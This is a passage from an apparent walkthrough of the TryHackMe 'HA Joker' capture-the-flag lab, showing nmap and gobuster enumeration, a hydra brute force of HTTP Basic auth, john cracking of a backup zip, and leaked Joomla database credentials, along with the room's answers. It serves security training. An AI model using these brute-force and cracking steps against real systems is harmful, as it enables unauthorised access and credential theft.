+</span></span><span class=line><span class=cl>|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
+</span></span><span class=line><span class=cl>|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
+</span></span><span class=line><span class=cl>80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span class=line><span class=cl>|_http-title: HA: Joker
+</span></span><span class=line><span class=cl>8080/tcp open  http    Apache httpd 2.4.29
+</span></span><span class=line><span class=cl>| http-auth:
+</span></span><span class=line><span class=cl>| HTTP/1.1 401 Unauthorized\x0D
+</span></span><span class=line><span class=cl>|_  Basic realm=Please enter the password.
+</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span class=line><span class=cl>|_http-title: 401 Unauthorized
+</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=10/8%OT=22%CT=1%CU=38238%PV=Y%DS=2%DC=I%G=Y%TM=5F7F533
+</span></span><span class=line><span class=cl>OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS
+</span></span><span class=line><span class=cl>OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
+</span></span><span class=line><span class=cl>OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+</span></span><span class=line><span class=cl>OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+</span></span><span class=line><span class=cl>OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+</span></span><span class=line><span class=cl>OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+</span></span><span class=line><span class=cl>OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+</span></span><span class=line><span class=cl>OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+</span></span><span class=line><span class=cl>OS:=S)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: 2 hops
+</span></span><span class=line><span class=cl>Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 59.49 seconds
+</span></span></code></pre></td></tr></table></div></div><ol><li><p>Enumerate services on target machine.</p></li><li><p>What version of Apache is it?</p></li></ol><blockquote><p>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))</p></blockquote><p><code>2.4.29</code></p><ol start=2><li>What port on this machine not need to be authenticated by user and password?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span class=line><span class=cl>|_http-title: HA: Joker
+</span></span></code></pre></td></tr></table></div></div><p><code>80</code></p><ol start=3><li>There is a file on this port that seems to be secret, what is it?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/HA Joker CTF$ gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.252.64 -x txt,php,html
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>Gobuster v3.0.1
+</span></span><span class=line><span class=cl>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>[+] Url:            http://10.10.252.64
+</span></span><span class=line><span class=cl>[+] Threads:        10
+</span></span><span class=line><span class=cl>[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+</span></span><span class=line><span class=cl>[+] Status codes:   200,204,301,302,307,401,403
+</span></span><span class=line><span class=cl>[+] User Agent:     gobuster/3.0.1
+</span></span><span class=line><span class=cl>[+] Extensions:     html,txt,php
+</span></span><span class=line><span class=cl>[+] Timeout:        10s
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/10/08 20:03:57 Starting gobuster
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>/.hta (Status: 403)
+</span></span><span class=line><span class=cl>/.hta.txt (Status: 403)
+</span></span><span class=line><span class=cl>/.hta.php (Status: 403)
+</span></span><span class=line><span class=cl>/.hta.html (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.php (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.html (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.txt (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.txt (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.php (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.html (Status: 403)
+</span></span><span class=line><span class=cl>/css (Status: 301)
+</span></span><span class=line><span class=cl>/img (Status: 301)
+</span></span><span class=line><span class=cl>/index.html (Status: 200)
+</span></span><span class=line><span class=cl>/index.html (Status: 200)
+</span></span><span class=line><span class=cl>/phpinfo.php (Status: 200)
+</span></span><span class=line><span class=cl>/phpinfo.php (Status: 200)
+</span></span><span class=line><span class=cl>/secret.txt (Status: 200)
+</span></span><span class=line><span class=cl>/server-status (Status: 403)
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/10/08 20:05:04 Finished
+</span></span><span class=line><span class=cl>===============================================================
+</span></span></code></pre></td></tr></table></div></div><p><code>secret.txt</code></p><ol start=5><li>There is another file which reveals information of the backend, what is it?</li></ol><p><code>phpinfo.php</code></p><ol><li>When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?</li></ol><ul><li><a href=http://10.10.252.64/secret.txt>http://10.10.252.64/secret.txt</a></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Batman hits Joker.
+</span></span><span class=line><span class=cl>Joker: &#34;Bats you may be a rock but you won&#39;t break me.&#34; (Laughs!)
+</span></span><span class=line><span class=cl>Batman: &#34;I will break you with this rock. You made a mistake now.&#34;
+</span></span><span class=line><span class=cl>Joker: &#34;This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock.&#34;
+</span></span><span class=line><span class=cl>Joker: &#34;HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!&#34;
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>What port on this machine need to be authenticated by Basic Authentication Mechanism?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>8080/tcp open  http    Apache httpd 2.4.29
+</span></span><span class=line><span class=cl>| http-auth:
+</span></span><span class=line><span class=cl>| HTTP/1.1 401 Unauthorized\x0D
+</span></span><span class=line><span class=cl>|_  Basic realm=Please enter the password.
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/HA Joker CTF$ hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.252.64 -m / http-get
+</span></span><span class=line><span class=cl>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-08 20:10:16
+</span></span><span class=line><span class=cl>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+</span></span><span class=line><span class=cl>[DATA] attacking http-get://10.10.252.64:8080/
+</span></span><span class=line><span class=cl>[8080][http-get] host: 10.10.252.64   login: joker   password: hannah
+</span></span><span class=line><span class=cl>1 of 1 target successfully completed, 1 valid password found
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-08 20:10:47
+</span></span></code></pre></td></tr></table></div></div><p><code>hannah</code></p><ol start=5><li>Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?</li></ol><ul><li><a href=http://10.10.252.64:8080/robots.txt>http://10.10.252.64:8080/robots.txt</a></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1># If the Joomla site is installed within a folder</span>
+</span></span><span class=line><span class=cl><span class=c1># eg www.example.com/joomla/ then the robots.txt file</span>
+</span></span><span class=line><span class=cl><span class=c1># MUST be moved to the site root</span>
+</span></span><span class=line><span class=cl><span class=c1># eg www.example.com/robots.txt</span>
+</span></span><span class=line><span class=cl><span class=c1># AND the joomla folder name MUST be prefixed to all of the</span>
+</span></span><span class=line><span class=cl><span class=c1># paths.</span>
+</span></span><span class=line><span class=cl><span class=c1># eg the Disallow rule for the /administrator/ folder MUST</span>
+</span></span><span class=line><span class=cl><span class=c1># be changed to read</span>
+</span></span><span class=line><span class=cl><span class=c1># Disallow: /joomla/administrator/</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># For more information about the robots.txt standard, see:</span>
+</span></span><span class=line><span class=cl><span class=c1># http://www.robotstxt.org/orig.html</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># For syntax checking, see:</span>
+</span></span><span class=line><span class=cl><span class=c1># http://tool.motoricerca.info/robots-checker.phtml</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>User</span><span class=o>-</span><span class=n>agent</span><span class=p>:</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>administrator</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>bin</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>cache</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>cli</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>components</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>includes</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>installation</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>language</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>layouts</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>libraries</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>logs</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>modules</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>plugins</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>/administrator/</code></p><ol><li>We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/HA Joker CTF$ gobuster dir -U joker -P hannah -u http://10.10.252.64:8080/ -x bak,old,tar,gz,tgz,zip,7z -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>Gobuster v3.0.1
+</span></span><span class=line><span class=cl>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>[+] Url:            http://10.10.252.64:8080/
+</span></span><span class=line><span class=cl>[+] Threads:        10
+</span></span><span class=line><span class=cl>[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+</span></span><span class=line><span class=cl>[+] Status codes:   200,204,301,302,307,401,403
+</span></span><span class=line><span class=cl>[+] User Agent:     gobuster/3.0.1
+</span></span><span class=line><span class=cl>[+] Auth User:      joker
+</span></span><span class=line><span class=cl>[+] Extensions:     gz,tgz,zip,7z,bak,old,tar
+</span></span><span class=line><span class=cl>[+] Timeout:        10s
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/10/08 20:33:58 Starting gobuster
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>/.hta (Status: 403)
+</span></span><span class=line><span class=cl>/.hta.tgz (Status: 403)
+</span></span><span class=line><span class=cl>/.hta.zip (Status: 403)
+</span></span><span class=line><span class=cl>/.hta.7z (Status: 403)
+</span></span><span class=line><span class=cl>/.hta.bak (Status: 403)
+</span></span><span class=line><span class=cl>/.hta.old (Status: 403)
+</span></span><span class=line><span class=cl>/.hta.tar (Status: 403)
+</span></span><span class=line><span class=cl>/.hta.gz (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.tar (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.gz (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.tgz (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.zip (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.7z (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.bak (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.old (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.bak (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.old (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.tar (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.gz (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.tgz (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.zip (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.7z (Status: 403)
+</span></span><span class=line><span class=cl>/LICENSE (Status: 200)
+</span></span><span class=line><span class=cl>/README (Status: 200)
+</span></span><span class=line><span class=cl>/administrator (Status: 301)
+</span></span><span class=line><span class=cl>/bin (Status: 301)
+</span></span><span class=line><span class=cl>/backup (Status: 200)
+</span></span><span class=line><span class=cl>/backup.zip (Status: 200)
+</span></span><span class=line><span class=cl>/cache (Status: 301)
+</span></span><span class=line><span class=cl>/components (Status: 301)
+</span></span><span class=line><span class=cl>/images (Status: 301)
+</span></span><span class=line><span class=cl>/includes (Status: 301)
+</span></span><span class=line><span class=cl>/index.php (Status: 200)
+</span></span><span class=line><span class=cl>/language (Status: 301)
+</span></span><span class=line><span class=cl>/layouts (Status: 301)
+</span></span><span class=line><span class=cl>/libraries (Status: 301)
+</span></span><span class=line><span class=cl>/media (Status: 301)
+</span></span><span class=line><span class=cl>/modules (Status: 301)
+</span></span><span class=line><span class=cl>/plugins (Status: 301)
+</span></span><span class=line><span class=cl>/robots (Status: 200)
+</span></span><span class=line><span class=cl>/robots.txt (Status: 200)
+</span></span><span class=line><span class=cl>^C
+</span></span><span class=line><span class=cl>[!] Keyboard interrupt detected, terminating.
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/10/08 20:35:44 Finished
+</span></span><span class=line><span class=cl>===============================================================
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>backup.zip
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>We have the backup file and now we should look for some information, for example database, configuration files, etc &mldr; But the backup file seems to be encrypted. What is the password?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/HA Joker CTF$ zip2john backup.zip &gt; backup.hash
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/HA Joker CTF$ john backup.hash
+</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
+</span></span><span class=line><span class=cl>Loaded 1 password hash (PKZIP [32/64])
+</span></span><span class=line><span class=cl>Will run 2 OpenMP threads
+</span></span><span class=line><span class=cl>Proceeding with single, rules:Single
+</span></span><span class=line><span class=cl>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span class=line><span class=cl>Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
+</span></span><span class=line><span class=cl>Almost done: Processing the remaining buffered candidate passwords, if any.
+</span></span><span class=line><span class=cl>Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
+</span></span><span class=line><span class=cl>Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+</span></span><span class=line><span class=cl>hannah           (backup.zip)
+</span></span><span class=line><span class=cl>1g 0:00:00:00 DONE 2/3 (2020-10-08 20:19) 6.250g/s 501856p/s 501856c/s 501856C/s 123456..Peter
+</span></span><span class=line><span class=cl>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+</span></span><span class=line><span class=cl>Session completed
+</span></span></code></pre></td></tr></table></div></div><p><code>hannah</code></p><ol start=3><li>Remember that&mldr; We need access to the administration of the site&mldr; Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?</li></ol><p><a href=configuration.php>configuration.php</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$dbtype</span> <span class=o>=</span> <span class=s1>&#39;mysqli&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$host</span> <span class=o>=</span> <span class=s1>&#39;localhost&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$user</span> <span class=o>=</span> <span class=s1>&#39;joomla&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$password</span> <span class=o>=</span> <span class=s1>&#39;1234&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$db</span> <span class=o>=</span> <span class=s1>&#39;joomladb&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$dbprefix</span> <span class=o>=</span> <span class=s1>&#39;cc1gr_&#39;</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=n>kali</span><span class=o>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>HA</span><span class=w> </span><span class=n>Joker</span><span class=w> </span><span class=n>CTF</span><span class=err>$</span><span class=w> </span><span class=n>grep</span><span class=w> </span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=n>db</span><span class=o>/</span><span class=n>joomladb</span><span class=p>.</span><span class=k>sql</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>grep</span><span class=w> </span><span class=k>user</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>grep</span><span class=p>:</span><span class=w> </span><span class=k>TABLE</span><span class=p>:</span><span class=w> </span><span class=n>No</span><span class=w> </span><span class=n>such</span><span class=w> </span><span class=n>file</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>directory</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>db</span><span class=o>/</span><span class=n>joomladb</span><span class=p>.</span><span class=k>sql</span><span class=p>:</span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=o>`</span><span class=n>cc1gr_user_keys</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>db</span><span class=o>/</span><span class=n>joomladb</span><span class=p>.</span><span class=k>sql</span><span class=p>:</span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=o>`</span><span class=n>cc1gr_user_notes</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>db</span><span class=o>/</span><span class=n>joomladb</span><span class=p>.</span><span class=k>sql</span><span class=p>:</span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=o>`</span><span class=n>cc1gr_user_profiles</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>db</span><span class=o>/</span><span class=n>joomladb</span><span class=p>.</span><span class=k>sql</span><span class=p>:</span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=o>`</span><span class=n>cc1gr_user_usergroup_map</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>db</span><span class=o>/</span><span class=n>joomladb</span><span class=p>.</span><span class=k>sql</span><span class=p>:</span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=o>`</span><span class=n>cc1gr_usergroups</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=w>
